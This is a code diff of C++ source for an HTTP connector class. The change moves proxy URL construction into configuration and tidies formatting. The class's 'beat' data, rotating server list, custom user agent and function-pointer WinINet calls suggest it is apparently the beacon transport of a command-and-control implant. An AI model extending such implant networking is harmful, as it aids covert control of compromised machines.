@@ -11,7 +11,7 @@ BOOL _isdigest(char c)
 	return c >= '0' && c <= '9';
 }
 
-int _atoi(const char* str) 
+int _atoi(const char* str)
 {
 	int result = 0;
 	int sign = 1;
@@ -19,17 +19,17 @@ int _atoi(const char* str)
 
 	while (str[index] == ' ')
 		index++;
-	
+
 	if (str[index] == '-' || str[index] == '+') {
 		sign = (str[index] == '-') ? -1 : 1;
 		index++;
 	}
 
-	while ( _isdigest(str[index]) ) {
+	while (_isdigest(str[index])) {
 		int digit = str[index] - '0';
-		if (result > (INT_MAX - digit) / 10) 
+		if (result > (INT_MAX - digit) / 10)
 			return (sign == 1) ? INT_MAX : INT_MIN;
-		
+
 		result = result * 10 + digit;
 		index++;
 	}
@@ -130,12 +130,52 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->ans_size		 = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
 
-	// Set proxy configuration
-	this->proxy_type     = profile.proxy_type;
-	this->proxy_host     = (CHAR*) profile.proxy_host;
-	this->proxy_port     = profile.proxy_port;
-	this->proxy_username = (CHAR*) profile.proxy_username;
-	this->proxy_password = (CHAR*) profile.proxy_password;
+	this->proxy_type = profile.proxy_type;
+	this->proxy_username = (CHAR*)profile.proxy_username;
+	this->proxy_password = (CHAR*)profile.proxy_password;
+
+	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
+		ULONG hostLen = _strlen((CHAR*)profile.proxy_host);
+		WORD port = profile.proxy_port;
+		CHAR portStr[6];
+		int portIdx = 0;
+		if (port == 0) {
+			portStr[portIdx++] = '0';
+		}
+		else {
+			CHAR temp[6];
+			int tempIdx = 0;
+			while (port > 0) {
+				temp[tempIdx++] = '0' + (port % 10);
+				port /= 10;
+			}
+			for (int i = tempIdx - 1; i >= 0; i--) {
+				portStr[portIdx++] = temp[i];
+			}
+		}
+		portStr[portIdx] = 0;
+
+		ULONG prefixLen = 0;
+		if (this->proxy_type == PROXY_TYPE_HTTPS) {
+			prefixLen = 8;
+		}
+		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
+		ULONG idx = 0;
+		if (this->proxy_type == PROXY_TYPE_HTTPS) {
+			this->proxy_url[idx++] = 'h';
+			this->proxy_url[idx++] = 't';
+			this->proxy_url[idx++] = 't';
+			this->proxy_url[idx++] = 'p';
+			this->proxy_url[idx++] = 's';
+			this->proxy_url[idx++] = ':';
+			this->proxy_url[idx++] = '/';
+			this->proxy_url[idx++] = '/';
+		}
+		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
+		idx += hostLen;
+		this->proxy_url[idx++] = ':';
+		memcpy(this->proxy_url + idx, portStr, portIdx + 1);
+	}
 
 	return TRUE;
 }
@@ -145,64 +185,28 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 	this->recvSize = 0;
 	this->recvData = 0;
 
-	ULONG attempt   = 0;
+	ULONG attempt = 0;
 	BOOL  connected = FALSE;
-	BOOL  result    = FALSE;
-	DWORD context   = 0;
+	BOOL  result = FALSE;
+	DWORD context = 0;
 
-	while ( !connected && attempt < this->server_count) {
+	while (!connected && attempt < this->server_count) {
 		DWORD dwError = 0;
 
 		if (!this->hInternet) {
-			// Check if proxy is configured
-			if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_host != NULL && _strlen(this->proxy_host) > 0) {
-				// Build proxy string: "http=http://host:port https=http://host:port" for HTTP proxy
-				// or "http=https://host:port https=https://host:port" for HTTPS proxy
-				CHAR proxyString[512];
-				ULONG idx = 0;
-				
-				// For HTTP proxy type, format is: "host:port"
-				// For HTTPS proxy type (CONNECT tunnel), format is: "https=host:port http=host:port"
-				ULONG hostLen = _strlen(this->proxy_host);
-				
-				// Convert port to string
-				WORD port = this->proxy_port;
-				CHAR portStr[6];
-				int portIdx = 0;
-				if (port == 0) {
-					portStr[portIdx++] = '0';
-				} else {
-					CHAR temp[6];
-					int tempIdx = 0;
-					while (port > 0) {
-						temp[tempIdx++] = '0' + (port % 10);
-						port /= 10;
-					}
-					// Reverse
-					for (int i = tempIdx - 1; i >= 0; i--) {
-						portStr[portIdx++] = temp[i];
-					}
-				}
-				portStr[portIdx] = 0;
-				
-				// Simple format: "host:port" works for both HTTP and HTTPS targets through HTTP proxy
-				memcpy(proxyString, this->proxy_host, hostLen);
-				idx = hostLen;
-				proxyString[idx++] = ':';
-				memcpy(proxyString + idx, portStr, portIdx + 1);
-				
-				this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_PROXY, proxyString, NULL, 0 );
-			} else {
-				// No proxy, use system default
-				this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
+			if (this->proxy_url != NULL) {
+				this->hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
+			}
+			else {
+				this->hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 			}
 		}
-		if ( this->hInternet ) {
+		if (this->hInternet) {
 
-			if ( !this->hConnect )
-				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
+			if (!this->hConnect)
+				this->hConnect = this->functions->InternetConnectA(this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
 
-			if ( this->hConnect )
+			if (this->hConnect)
 			{
 				CHAR acceptTypes[] = { '*', '/', '*', 0 };
 				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
@@ -210,7 +214,7 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 				if (this->ssl)
 					flags |= INTERNET_FLAG_SECURE;
 
-				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
+				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
 				if (hRequest) {
 					if (this->ssl) {
 						DWORD dwFlags = 0;
@@ -223,10 +227,9 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
 					}
 
-					// Set proxy authentication if configured
-					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL && _strlen(this->proxy_username) > 0) {
+					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
 						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, _strlen(this->proxy_username));
-						if (this->proxy_password != NULL && _strlen(this->proxy_password) > 0) {
+						if (this->proxy_password != NULL) {
 							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, _strlen(this->proxy_password));
 						}
 					}
